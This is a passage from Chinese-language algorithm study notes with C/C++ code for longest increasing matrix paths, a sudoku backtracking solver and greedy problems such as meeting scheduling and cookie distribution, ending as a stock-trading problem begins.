class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX = <span class="hljs-number">100</span>;  <span class="hljs-comment">// 假设最大矩阵为100x100</span><br><span class="hljs-type">int</span> m, n;  <span class="hljs-comment">// 矩阵的行列数</span><br><span class="hljs-type">int</span> matrix[MAX][MAX];<br>vector&lt;<span class="hljs-type">int</span>&gt; to[MAX * MAX];  <span class="hljs-comment">// 邻接表</span><br><span class="hljs-type">int</span> deg[MAX * MAX];  <span class="hljs-comment">// 节点的入度</span><br><span class="hljs-type">int</span> dist[MAX * MAX];  <span class="hljs-comment">// 从每个节点出发的最长路径</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addEdge</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> v)</span> </span>&#123;<br>    deg[v]++;<br>    to[u].<span class="hljs-built_in">push_back</span>(v);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">num</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> i * n + j;  <span class="hljs-comment">// 将二维坐标转换为一维编号</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">valid</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> i &gt;= <span class="hljs-number">0</span> &amp;&amp; i &lt; m &amp;&amp; j &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; n;  <span class="hljs-comment">// 判断是否在矩阵内</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestIncreasingPath</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 构建图</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>                <span class="hljs-type">int</span> ni = i + dx[k];<br>                <span class="hljs-type">int</span> nj = j + dy[k];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">valid</span>(ni, nj) &amp;&amp; matrix[ni][nj] &gt; matrix[i][j]) &#123;<br>                    <span class="hljs-built_in">addEdge</span>(<span class="hljs-built_in">num</span>(i, j), <span class="hljs-built_in">num</span>(ni, nj));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 进行拓扑排序</span><br>    queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m * n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (deg[i] == <span class="hljs-number">0</span>) &#123;<br>            q.<span class="hljs-built_in">push</span>(i);<br>            dist[i] = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 初始点的路径长度是1</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 拓扑排序，更新每个节点的最长路径</span><br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>            deg[y]--;<br>            dist[y] = <span class="hljs-built_in">max</span>(dist[y], dist[x] + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (deg[y] == <span class="hljs-number">0</span>) q.<span class="hljs-built_in">push</span>(y);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 找出最长路径</span><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m * n; i++) &#123;<br>        ans = <span class="hljs-built_in">max</span>(ans, dist[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; m &gt;&gt; n;<br>    <span class="hljs-comment">// 输入矩阵数据</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            cin &gt;&gt; matrix[i][j];<br>        &#125;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-built_in">longestIncreasingPath</span>() &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们就知道了，在一张有效无环图上，不管是球最长啊。统计什么别的信息，只要这个信息需要对所有的哎入编做统计，比如取max，下求和等等，我们就可以使用。图排序来进行这样一个信息统计。</p><p>另一种方法：dfs记忆化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> m, n;<br><span class="hljs-type">int</span> matrix[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<br><span class="hljs-type">int</span> dist[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>]; <span class="hljs-comment">// 用于记录最长路径的长度</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">valid</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> i &gt;= <span class="hljs-number">0</span> &amp;&amp; i &lt; m &amp;&amp; j &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (dist[x][y] != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> dist[x][y]; <span class="hljs-comment">// 如果已经计算过，则返回</span><br>    dist[x][y] = <span class="hljs-number">1</span>; <span class="hljs-comment">// 初始化当前路径长度</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>        <span class="hljs-type">int</span> nx = x + dx[k];<br>        <span class="hljs-type">int</span> ny = y + dy[k];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">valid</span>(nx, ny) &amp;&amp; matrix[nx][ny] &gt; matrix[x][y]) &#123;<br>            dist[x][y] = <span class="hljs-built_in">max</span>(dist[x][y], <span class="hljs-built_in">dfs</span>(nx, ny) + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dist[x][y];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestIncreasingPath</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 遍历每个位置，进行深度优先搜索，找出最长递增路径</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            ans = <span class="hljs-built_in">max</span>(ans, <span class="hljs-built_in">dfs</span>(i, j));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; m &gt;&gt; n; <span class="hljs-comment">// 输入行和列数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            cin &gt;&gt; matrix[i][j]; <span class="hljs-comment">// 输入矩阵元素</span><br>        &#125;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-built_in">longestIncreasingPath</span>() &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="数独问题"><a href="#数独问题" class="headerlink" title="数独问题"></a>数独问题</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*s[11][11]：这是一个二维字符数组，用来表示数独的 9x9 网格。每个元素表示一个格子，值为 . 表示空格，1 到 9 代表已经填入的数字。</span><br><span class="hljs-comment">h[11][11]：用于记录每一行中数字是否已经被使用。h[x][i] 为 1 表示数字 i 已经在第 x 行使用。</span><br><span class="hljs-comment">l[11][11]：用于记录每一列中数字是否已经被使用。l[y][i] 为 1 表示数字 i 已经在第 y 列使用。</span><br><span class="hljs-comment">g[5][5][11]：用于记录每个 3x3 宫格中数字是否已经被使用。g[x/3][y/3][i] 为 1 表示数字 i 已经在 (x, y) 位置对应的 3x3 宫格中使用。 */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">char</span> s[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>];<br><span class="hljs-type">int</span> h[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>], l[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>], g[<span class="hljs-number">5</span>][<span class="hljs-number">5</span>][<span class="hljs-number">11</span>];<br><span class="hljs-type">int</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">if</span> (y == <span class="hljs-number">9</span>) x++, y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (x == <span class="hljs-number">9</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) <span class="hljs-built_in">cout</span> &lt;&lt; s[i] &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (s[x][y] != <span class="hljs-string">&#x27;.&#x27;</span>) <span class="hljs-keyword">return</span> dfs(x, y + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= <span class="hljs-number">9</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (h[x][i] || l[y][i] || g[x / <span class="hljs-number">3</span>][y / <span class="hljs-number">3</span>][i]) <span class="hljs-keyword">continue</span>;<br>        h[x][i] = l[y][i] = g[x / <span class="hljs-number">3</span>][y / <span class="hljs-number">3</span>][i] = <span class="hljs-number">1</span>;<br>        s[x][y] = i + <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (dfs(x, y + <span class="hljs-number">1</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        h[x][i] = l[y][i] = g[x / <span class="hljs-number">3</span>][y / <span class="hljs-number">3</span>][i] = <span class="hljs-number">0</span>;<br>        s[x][y] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; s[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt; <span class="hljs-number">9</span>; j++) &#123;<br>            <span class="hljs-keyword">if</span> (s[i][j] == <span class="hljs-string">&#x27;.&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-type">int</span> x = s[i][j] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            h[i][x] = l[j][x] = g[i / <span class="hljs-number">3</span>][j / <span class="hljs-number">3</span>][x] = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    dfs(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="二进制枚举-填空题"><a href="#二进制枚举-填空题" class="headerlink" title="二进制枚举(填空题)"></a>二进制枚举(填空题)</h3><hr><h2 id="十八-贪心"><a href="#十八-贪心" class="headerlink" title="十八. 贪心"></a>十八. 贪心</h2><p>1)最自然智慧的算法<br>2)用一种局部最功利的标准，总是做出在当前看来是最好的选择<br>3)难点在于证明局部最功利的标准可以得到全局最优解<br>4)对于贪心算法的学习主要以增加阅历和经验为主</p><p>只要举出一个错误解就是无效的，我们每个人都会对局部定义一个比较好的状况，然后我们想一步一步按照我们的想法执行，那么你每一步定的那个策略，它就属属于你的贪心策略。他能够推出最终的最优解，那贪心策略就是有效的，他是贪不出来他那最最终策略就是无效的，</p><p>但是证明是不可能证明的，要用对数器，写一个暴力解比对贪心策略,也不用太研究，就记住以下例题就行</p><h3 id="例题-9"><a href="#例题-9" class="headerlink" title="例题"></a>例题</h3><h4 id="会议室"><a href="#会议室" class="headerlink" title="会议室"></a>会议室</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 会议结构体</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Program</span> &#123;</span><br>    <span class="hljs-type">int</span> start, end;<br>&#125;;<br><br><span class="hljs-comment">// 自定义排序规则，按照会议的结束时间升序排序</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">cmp</span><span class="hljs-params">(<span class="hljs-type">const</span> Program&amp; a, <span class="hljs-type">const</span> Program&amp; b)</span> &#123;<br>    <span class="hljs-keyword">return</span> a.end &lt; b.end;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">bestArrange2</span><span class="hljs-params">(Program programs[], <span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-comment">// 按照结束时间升序排序</span><br>    sort(programs, programs + n, cmp);<br>    <br>    <span class="hljs-type">int</span> timeLine = <span class="hljs-number">0</span>, result = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 贪心策略：选择结束时间最早的会议</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (timeLine &lt;= programs[i].start) &#123;<br>            result++;<br>            timeLine = programs[i].end;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;<br>    Program programs[<span class="hljs-number">100</span>]; <span class="hljs-comment">// 预设最多100个会议</span><br>    <span class="hljs-comment">// 输入会议时间</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; programs[i].start &gt;&gt; programs[i].end;<br>    &#125;<br>    <span class="hljs-comment">// 输出最多可以安排的会议数量</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; bestArrange2(programs, n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="分发饼干"><a href="#分发饼干" class="headerlink" title="分发饼干"></a>分发饼干</h4><p>假设你是一位很慷慨的家长，想要给孩子们一些小饼干。但是，每个孩子最多只能得到一块饼干。</p><ul><li>每个孩子都有一个胃口值 <code>g[i]</code>，代表满足这个孩子所需的饼干大小。</li><li>每块饼干的大小用 <code>s[j]</code> 表示。</li><li>只有当饼干的大小 <code>s[j] &gt;= g[i]</code> 时，这块饼干才能满足孩子的胃口。</li></ul><p><strong>示例 1</strong>：</p><ul><li><strong>输入</strong>：<code>g = [1, 2, 3]</code>, <code>s = [1, 1]</code></li><li><strong>输出</strong>：<code>1</code></li><li><strong>解释</strong>：你有 3 个孩子，胃口值分别是 1、2、3，有 2 块饼干，大小都是 1。只能满足胃口值为 1 的孩子，所以输出 1。</li></ul><p><strong>示例 2</strong>：</p><ul><li><strong>输入</strong>：<code>g = [1, 2]</code>, <code>s = [1, 2, 3]</code></li><li><strong>输出</strong>：<code>2</code></li><li><strong>解释</strong>：你有 2 个孩子，胃口值分别是 1、2，有 3 块饼干，大小分别是 1、2、3。可以满足所有孩子的需求，所以输出 2。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//贪心策略是小饼干先喂饱小胃口</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findContentChildren</span><span class="hljs-params">(<span class="hljs-type">int</span> g[], <span class="hljs-type">int</span> s[], <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">sort</span>(g, g + m); <span class="hljs-comment">// 对孩子的胃口值排序</span><br>    <span class="hljs-built_in">sort</span>(s, s + n); <span class="hljs-comment">// 对饼干的大小排序</span><br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; <span class="hljs-comment">// 饼干索引</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &lt; n &amp;&amp; s[j] &lt; g[i]) j++; <span class="hljs-comment">// 找到满足当前孩子胃口的饼干</span><br>        <span class="hljs-keyword">if</span> (j &lt; n) &#123; <span class="hljs-comment">// 如果找到满足条件的饼干</span><br>            ans++; <span class="hljs-comment">// 满足一个孩子</span><br>            j++; <span class="hljs-comment">// 使用一块饼干</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> m, n;<br>    cin &gt;&gt; m &gt;&gt; n;<br>    <span class="hljs-type">int</span> g[m], s[n];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) cin &gt;&gt; g[i]; <span class="hljs-comment">// 孩子的胃口</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) cin &gt;&gt; s[i]; <span class="hljs-comment">// 饼干的大小</span><br>    <br>    cout &lt;&lt; <span class="hljs-built_in">findContentChildren</span>(g, s, m, n) &lt;&lt; endl; <span class="hljs-comment">// 输出结果</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*贪心算法成立的条件：</span><br><span class="hljs-comment">问题类型：本题属于资源分配问题，与零钱找零问题类似，目标是尽可能满足需求。贪心算法在这种情况下有效，因为我们希望通过合理分配资源来满足尽可能多的孩子。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">条件满足：在本题中，每个孩子只能得到一块饼干，并且不同饼干大小是可以互相满足的（一个大饼干既可以满足小胃口的孩子，也可以满足大胃口的孩子）。因此，通过贪心算法优先满足小胃口的孩子，就能将剩余的大饼干留给更需要的大胃口孩子，提升满足总人数。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">面值分析（在本题中的对应）：</span><br><span class="hljs-comment">胃口大小与饼干大小分析：</span><br><span class="hljs-comment">孩子的胃口值数组 g 和饼干大小数组 s 都按从小到大的顺序排序。</span><br><span class="hljs-comment">如果能够用一个较小的饼干满足小胃口的孩子，那么这块饼干必然也能满足所有比该孩子胃口更小的孩子。因此，优先使用小饼干满足小胃口的孩子可以最大化满足需求，并留出更多大的饼干给大胃口的孩子。</span><br><span class="hljs-comment">决策包容性：</span><br><span class="hljs-comment">包容性分析：</span><br><span class="hljs-comment">在选择分配饼干时，优先选择满足小胃口的孩子，确保我们把最小的饼干分配给最适合的孩子。这样即使后续需求更大，我们仍然保有较大饼干以满足较高的需求。</span><br><span class="hljs-comment">这种选择包含了未来的可能性（即更大胃口的孩子仍能得到较大的饼干），确保资源利用最大化，增加整体满足的可能性。</span><br><span class="hljs-comment">贪心策略：</span><br><span class="hljs-comment">贪心策略：在分配时，优先分配小饼干给小胃口的孩子，尽可能满足最小需求，从而将较大的资源保留给更高需求的情况。这样可以提高整体满足率，实现题目目标。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h4 id="买卖股票的最佳时机"><a href="#买卖股票的最佳时机" class="headerlink" title="买卖股票的最佳时机"></a>买卖股票的最佳时机</h4><p>给定一个数组 <code>prices</code>，其中 <code>prices[i]</code> 表示第 <code>i</code> 天的股票价格。 